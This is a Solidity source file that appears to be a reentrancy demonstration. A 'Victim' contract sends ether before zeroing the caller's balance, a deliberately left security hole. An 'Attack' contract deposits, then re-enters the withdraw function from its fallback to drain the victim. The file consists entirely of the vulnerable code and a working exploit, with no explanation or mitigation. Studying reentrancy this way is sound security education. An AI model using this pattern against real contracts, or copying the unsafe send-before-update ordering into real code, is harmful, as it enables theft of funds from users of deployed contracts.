// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract Victim{

    mapping(address=>uint256) balances;
    function deposit()external payable{
        balances[msg.sender]+=msg.value;
    }
    function withDraw()external {
        uint256 bal=balances[msg.sender];
        require(bal>0,"You do have Zero balance");
        (bool success,)=msg.sender.call{value: bal}("");
        require(success,"Transaction Failed");
        balances[msg.sender]=0;
    }
    function getBalance()public view returns(uint256){
        return address(this).balance;
    }

}
contract Attack{
    Victim victim;

    constructor(address _victim) {
        victim=Victim(_victim);
    }

    fallback() external payable {
        if(address(victim).balance>0){
            victim.withDraw();
        }

     }
    //  receive() external payable { }

    function attack()external payable{
        victim.deposit{value:msg.value}();
        victim.withDraw();
    }
    function getBalance()public view returns(uint256){
        return address(this).balance;
    }
}